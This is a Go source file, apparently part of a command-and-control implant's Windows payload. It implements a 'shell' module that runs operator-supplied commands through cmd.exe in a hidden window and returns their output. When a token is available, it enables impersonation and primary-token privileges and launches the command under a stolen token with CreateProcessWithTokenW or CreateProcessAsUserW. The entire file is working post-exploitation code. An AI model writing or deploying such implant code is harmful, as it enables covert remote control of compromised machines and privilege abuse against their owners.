// server/docker/payloads/Windows/action_shell_windows.go
//go:build windows
// +build windows

package main

import (
	"bytes"
	"context"
	"fmt"
	"os/exec"
	"strconv"
	"strings"
	"syscall"
	"time"
	"unsafe"
)

type ShellCommand struct{}

func (c *ShellCommand) Name() string {
	return "shell"
}

func (c *ShellCommand) Execute(ctx *CommandContext, args []string) CommandResult {
	if len(args) == 0 {
		return CommandResult{
			Output: "",
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Default timeout
	timeout := 30 * time.Second
	commandArgs := args

	// Parse flags
	i := 0
	for i < len(args) {
		switch args[i] {
		case "--timeout":
			if i+1 >= len(args) {
				return CommandResult{
					Output:      Err(E20),
					ExitCode:    1,
					CompletedAt: time.Now().Format(time.RFC3339),
				}
			}

			timeoutSeconds, err := strconv.Atoi(args[i+1])
			if err != nil || timeoutSeconds <= 0 {
				return CommandResult{
					Output:      ErrCtx(E22, args[i+1]),
					ExitCode:    1,
					CompletedAt: time.Now().Format(time.RFC3339),
				}
			}
			timeout = time.Duration(timeoutSeconds) * time.Second
			i += 2

		default:
			commandArgs = args[i:]
			i = len(args) // Break the loop
		}
	}

	if len(commandArgs) == 0 {
		return CommandResult{
			Output:      Err(E1),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Special handling for dir command with paths ending in backslash
	var commandStr string
	if len(commandArgs) >= 2 && strings.ToLower(commandArgs[0]) == "dir" {
		// Check if we have a path argument that ends with backslash
		path := commandArgs[1]
		if strings.HasSuffix(path, "\\") {
			// For paths ending in \, we need to add a dot to make it work
			commandArgs[1] = path + "."
		}
		commandStr = strings.Join(commandArgs, " ")
	} else {
		// For all other commands, just join normally
		commandStr = strings.Join(commandArgs, " ")
	}

	// Get working directory
	ctx.mu.RLock()
	workingDir := ctx.WorkingDir
	ctx.mu.RUnlock()

	var output strings.Builder

	// Check if we have an active token
	hasToken, _ := CheckTokenContext(ctx)

	if hasToken {
		token, gotToken := GetTokenForExecution(ctx)
		if gotToken {
			defer CleanupToken(token)
			return c.executeWithToken(commandStr, workingDir, timeout, &output, token)
		}
	}

	return c.executeNormal(commandStr, workingDir, timeout, &output)
}

// executeWithToken executes a command using the provided token
func (c *ShellCommand) executeWithToken(commandStr string, workingDir string, timeout time.Duration, output *strings.Builder, token syscall.Token) CommandResult {
	// Try to enable required privileges
	EnablePrivilege("SeImpersonatePrivilege")

	// Prepare command line
	cmdLine := fmt.Sprintf("cmd.exe /c %s", commandStr)
	cmdLineUTF16, err := syscall.UTF16PtrFromString(cmdLine)
	if err != nil {
		return CommandResult{
			Output:      Err(E19),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Convert working directory
	var workDirPtr *uint16
	if workingDir != "" {
		workDirPtr, err = syscall.UTF16PtrFromString(workingDir)
		if err != nil {
			return CommandResult{
				Output:      Err(E19),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}
	}

	// Create pipes for stdout/stderr capture
	var stdoutRead, stdoutWrite, stderrRead, stderrWrite syscall.Handle
	sa := syscall.SecurityAttributes{
		Length:        uint32(unsafe.Sizeof(syscall.SecurityAttributes{})),
		InheritHandle: 1,
	}

	err = syscall.CreatePipe(&stdoutRead, &stdoutWrite, &sa, 0)
	if err != nil {
		return CommandResult{
			Output:      Err(E19),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
	defer syscall.CloseHandle(stdoutRead)
	defer syscall.CloseHandle(stdoutWrite)

	err = syscall.CreatePipe(&stderrRead, &stderrWrite, &sa, 0)
	if err != nil {
		return CommandResult{
			Output:      Err(E19),
			ExitCode:    1,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}
	defer syscall.CloseHandle(stderrRead)
	defer syscall.CloseHandle(stderrWrite)

	// Set up STARTUPINFO
	si := STARTUPINFO{
		Cb:         uint32(unsafe.Sizeof(STARTUPINFO{})),
		Flags:      STARTF_USESHOWWINDOW | STARTF_USESTDHANDLES,
		ShowWindow: SW_HIDE,
		StdOutput:  stdoutWrite,
		StdError:   stderrWrite,
	}

	var pi PROCESS_INFORMATION

	// Try CreateProcessWithTokenW first (requires less privileges)
	ret, _, _ := procCreateProcessWithTokenW.Call(
		uintptr(token),
		0, // dwLogonFlags (0 = default)
		0, // lpApplicationName (null = use command line)
		uintptr(unsafe.Pointer(cmdLineUTF16)),
		uintptr(CREATE_NO_WINDOW),
		0, // lpEnvironment (null = inherit)
		uintptr(unsafe.Pointer(workDirPtr)),
		uintptr(unsafe.Pointer(&si)),
		uintptr(unsafe.Pointer(&pi)),
	)

	if ret == 0 {
		// If CreateProcessWithTokenW fails, try CreateProcessAsUserW as fallback
		EnablePrivilege("SeAssignPrimaryTokenPrivilege")
		EnablePrivilege("SeIncreaseQuotaPrivilege")

		ret, _, _ = procCreateProcessAsUserW.Call(
			uintptr(token),
			0, // lpApplicationName (null = use command line)
			uintptr(unsafe.Pointer(cmdLineUTF16)),
			0, // lpProcessAttributes
			0, // lpThreadAttributes
			1, // bInheritHandles = TRUE
			uintptr(CREATE_NO_WINDOW),
			0, // lpEnvironment (null = inherit)
			uintptr(unsafe.Pointer(workDirPtr)),
			uintptr(unsafe.Pointer(&si)),
			uintptr(unsafe.Pointer(&pi)),
		)

		if ret == 0 {
			return CommandResult{
				Output:      Err(E43),
				ExitCode:    1,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}
	}

	// Close write ends of pipes
	syscall.CloseHandle(stdoutWrite)
	syscall.CloseHandle(stderrWrite)

	// Set up timeout
	timeoutMs := uint32(timeout.Milliseconds())
	if timeout == 0 {
		timeoutMs = syscall.INFINITE
	}

	// Wait for process to complete or timeout
	event, _ := WaitForSingleObject(pi.Process, timeoutMs)

	// Read output from pipes
	stdoutBuf := make([]byte, 4096)
	stderrBuf := make([]byte, 4096)

	var stdoutData, stderrData []byte
	for {
		var read uint32
		err := syscall.ReadFile(stdoutRead, stdoutBuf, &read, nil)
		if err != nil || read == 0 {
			break
		}
		stdoutData = append(stdoutData, stdoutBuf[:read]...)
	}

	for {
		var read uint32
		err := syscall.ReadFile(stderrRead, stderrBuf, &read, nil)
		if err != nil || read == 0 {
			break
		}
		stderrData = append(stderrData, stderrBuf[:read]...)
	}

	// Add output to result
	if len(stdoutData) > 0 {
		output.WriteString(string(stdoutData))
	}

	if len(stderrData) > 0 {
		if len(stdoutData) > 0 {
			output.WriteString("\n")
		}
		output.WriteString(string(stderrData))
	}

	// Handle timeout
	if event == syscall.WAIT_TIMEOUT {
		TerminateProcess(pi.Process, 124)
		CloseHandle(pi.Process)
		CloseHandle(pi.Thread)
		return CommandResult{
			Output:      Err(E9),
			ExitCode:    124,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	// Get exit code
	var exitCode uint32
	GetExitCodeProcess(pi.Process, &exitCode)

	// Clean up handles
	CloseHandle(pi.Process)
	CloseHandle(pi.Thread)

	return CommandResult{
		Output:      output.String(),
		ExitCode:    int(exitCode),
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}

// executeNormal executes a command normally without token impersonation
func (c *ShellCommand) executeNormal(commandStr string, workingDir string, timeout time.Duration, output *strings.Builder) CommandResult {
	// Create command with context for timeout
	execContext, cancel := context.WithTimeout(context.Background(), timeout)
	defer cancel()

	// Use cmd.exe
	cmd := exec.CommandContext(execContext, "cmd.exe", "/c", commandStr)

	// Hide the console window on Windows
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: CREATE_NO_WINDOW,
	}

	// Set working directory
	cmd.Dir = workingDir

	// Capture output
	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	// Execute the command
	err := cmd.Run()

	// Add stdout to output
	if stdout.Len() > 0 {
		output.WriteString(stdout.String())
	}

	// Add stderr if present
	if stderr.Len() > 0 {
		if stdout.Len() > 0 {
			output.WriteString("\n")
		}
		output.WriteString(stderr.String())
	}

	// Handle errors
	if err != nil {
		// Check if it was a timeout
		if execContext.Err() == context.DeadlineExceeded {
			return CommandResult{
				Output:      Err(E9),
				ExitCode:    124,
				CompletedAt: time.Now().Format(time.RFC3339),
			}
		}

		// Get exit code if available
		exitCode := 1
		if exitErr, ok := err.(*exec.ExitError); ok {
			exitCode = exitErr.ExitCode()
		}

		return CommandResult{
			Output:      output.String(),
			ExitCode:    exitCode,
			CompletedAt: time.Now().Format(time.RFC3339),
		}
	}

	return CommandResult{
		Output:      output.String(),
		ExitCode:    0,
		CompletedAt: time.Now().Format(time.RFC3339),
	}
}
